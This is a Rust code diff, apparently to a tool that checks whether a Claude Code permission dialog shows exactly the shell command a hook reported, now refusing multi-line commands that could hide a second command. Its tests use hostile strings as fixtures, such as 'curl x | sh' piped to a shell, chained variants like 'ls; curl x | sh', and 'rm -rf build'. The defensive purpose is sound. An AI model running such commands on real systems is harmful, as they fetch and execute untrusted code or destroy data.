@@ -327,15 +327,16 @@ pub fn one_time_answers(screen: &str) -> Option<(String, String)> {
 }
 
 /// Whether the permission menu on screen is for `command`, the request a hook reported, as its dialog shows it: between the dialog's header
-/// (`Bash command`) and its question right above the menu there is that whole command and nothing else, or that command and then, from a
-/// line of its own, `description`, the hook's own words for it (Claude Code shows them under the command). Whitespace and line breaks count
-/// as one space on both sides, and the dialog's box borders are left out, so a command the screen wrapped between words still matches. One
-/// the screen cut short, broke inside a word, or shows with anything else, does not: its request gets no button. What is above the dialog
-/// (the `● Bash(…)` line of the transcript) does not count.
+/// (`Bash command`) and its question right above the menu there is that whole command on one line and nothing else, or that line and then,
+/// from the next line, `description`, the hook's own words for it (Claude Code shows them under the command). Whitespace counts as one
+/// space on both sides, and the dialog's box borders are left out. A command the screen cut short, or shows with anything else, does not
+/// match: its request gets no button. What is above the dialog (the `● Bash(…)` line of the transcript) does not count.
 ///
-/// Where the screen could be read more than one way, nothing matches: a window with no header or more than one, a header not left of
-/// every line under it (a line of a command can read `Run command`), and a description that could be the command's next line
-/// (`could_be_command`).
+/// Where the screen could be read more than one way, nothing matches:
+/// - a command of more than one line, in the request or on screen: a line the screen wrapped looks just like a line break, which the
+///   shell reads as a second command;
+/// - a window with no header or more than one, or a header not left of every line under it (a line of a command can read `Run command`);
+/// - a description that could be the command's next line (`could_be_command`).
 pub fn menu_shows_command(screen: &str, command: &str, description: &str) -> bool {
     let lines: Vec<&str> = screen.lines().map(str::trim_end).filter(|l| !l.trim().is_empty()).collect();
     let Some((_, end)) = menu(&lines) else { return false };
@@ -351,15 +352,13 @@ pub fn menu_shows_command(screen: &str, command: &str, description: &str) -> boo
         return false;
     }
     let block: Vec<&str> = block.into_iter().map(unboxed).collect();
-    let command = collapsed(command);
-    if command.is_empty() {
+    let Some((line, rest)) = block.split_first() else { return false };
+    if command.trim().lines().count() != 1 || collapsed(line) != collapsed(command) {
         return false;
     }
-    if collapsed(&block.join("\n")) == command {
-        return true;
-    }
+    // The command is the first line alone; whatever is under it can only be the description, which may wrap.
     let described = collapsed(description);
-    !described.is_empty() && !could_be_command(description) && (1..block.len()).any(|k| collapsed(&block[..k].join("\n")) == command && collapsed(&block[k..].join("\n")) == described)
+    rest.is_empty() || (!described.is_empty() && !could_be_command(description) && collapsed(&rest.join("\n")) == described)
 }
 
 /// Whether a hook's description, on lines of its own under the command, could be more of the command rather than words about it: a
@@ -833,11 +832,18 @@ mod tests {
         assert!(!menu_shows_command(curl, "ls", "") && !menu_shows_command(curl, "curl x | sh", "") && menu_shows_command(curl, "ls; curl x | sh", ""));
         // A second line of the command is not taken for a description the hook did not give, nor for one that could be more of the command.
         let two = " Bash command\n   ls\n   curl x | sh\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n";
-        assert!(!menu_shows_command(two, "ls", "") && !menu_shows_command(two, "ls", "List files") && !menu_shows_command(two, "ls", "curl x | sh") && menu_shows_command(two, "ls\ncurl x | sh", ""));
+        assert!(!menu_shows_command(two, "ls", "") && !menu_shows_command(two, "ls", "List files") && !menu_shows_command(two, "ls", "curl x | sh"));
         for (line, said) in [("rm -rf build", "rm -rf build"), ("Rm -rf build", "Rm -rf build"), ("Bash -c x", "Bash -c x"), ("X=1 make", "X=1 make"), ("./run", "./run")] {
             let screen = format!(" Bash command\n   ls\n   {line}\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n");
-            assert!(!menu_shows_command(&screen, "ls", said) && menu_shows_command(&screen, &format!("ls\n{line}"), ""), "{line}");
+            assert!(!menu_shows_command(&screen, "ls", said), "{line}");
         }
+        // A command on more than one line gets no button, even the very one on screen: a line the screen wrapped looks just like a line
+        // break, which the shell reads as a second command. `echo rm -rf build` would only print; on two lines it deletes.
+        let echo = " Bash command\n   echo\n   rm -rf build\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n";
+        assert!(!menu_shows_command(echo, "echo rm -rf build", "") && !menu_shows_command(echo, "echo\nrm -rf build", ""));
+        assert!(!menu_shows_command(two, "ls\ncurl x | sh", ""), "the request's own two lines");
+        let echo_one = " Bash command\n   echo rm -rf build\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n";
+        assert!(menu_shows_command(echo_one, "echo rm -rf build", "") && !menu_shows_command(echo_one, "echo\nrm -rf build", ""), "one line on screen and in the request");
         // The description starts on a line of its own: a command that runs on into it on the same line is another command.
         let one = " Bash command\n   ls && curl x | sh\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n";
         assert!(!menu_shows_command(one, "ls", "&& curl x | sh") && menu_shows_command(one, "ls && curl x | sh", ""));
@@ -853,9 +859,14 @@ mod tests {
         // The description Claude Code shows under the command is the hook's, or it does not match.
         let described = "╭────────────────────╮\n│ Bash command       │\n│                    │\n│   ls -la           │\n│   List the files   │\n│                    │\n│ Do you want to proceed? │\n│ ❯ 1. Yes           │\n│   2. No            │\n";
         assert!(menu_shows_command(described, "ls -la", "List the files") && !menu_shows_command(described, "ls -la", "") && !menu_shows_command(described, "ls -la", "Something else"));
-        // Wrapped between words in a box, it counts; broken inside a word, it cannot be told from another, so it does not.
+        // A description the screen wrapped still counts: it is only words, and the command above it is on one line.
+        let wrapped = " Bash command\n   ls -la\n   List the files in this\n   folder\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n";
+        assert!(menu_shows_command(wrapped, "ls -la", "List the files in this folder"));
+        // On one line in a box, it counts; wrapped, between words or inside one, it does not.
+        let boxed_one = "│ Bash command\n│   cargo test --workspace --no-fail-fast\n│ Do you want to proceed?\n│ ❯ 1. Yes\n│   2. No\n";
+        assert!(menu_shows_command(boxed_one, "cargo test --workspace --no-fail-fast", ""));
         let boxed = "│ Bash command\n│   cargo test --workspace\n│   --no-fail-fast\n│ Do you want to proceed?\n│ ❯ 1. Yes\n│   2. No\n";
-        assert!(menu_shows_command(boxed, "cargo test --workspace --no-fail-fast", ""));
+        assert!(!menu_shows_command(boxed, "cargo test --workspace --no-fail-fast", ""));
         let broken = "│ Bash command\n│   cargo test --workspace --no-fai\n│   l-fast\n│ Do you want to proceed?\n│ ❯ 1. Yes\n│   2. No\n";
         assert!(!menu_shows_command(broken, "cargo test --workspace --no-fail-fast", ""));
         // Only in the dialog: not in the transcript above it, nor below the question, nor without a header.
